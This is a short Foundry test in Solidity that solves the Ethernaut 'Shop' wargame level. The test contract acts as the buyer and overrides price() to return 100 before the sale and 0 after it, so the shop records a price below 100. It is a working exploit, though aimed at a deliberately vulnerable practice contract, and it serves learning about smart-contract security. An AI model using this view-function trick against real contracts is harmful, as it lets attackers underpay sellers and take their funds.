// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

import {Shop, Buyer} from "ethernaut/levels/Shop.sol";

contract ShopTest is Test, Buyer {
    Shop public victim;
    uint256 public count = 1;

    function setUp() public {
        victim = new Shop();
    }

    function testAttack() external {
        victim.buy();

        require(victim.price() < 100);
    }

    function price() public view override returns (uint) {
        return victim.isSold() ? 0 : 100;
    }
}
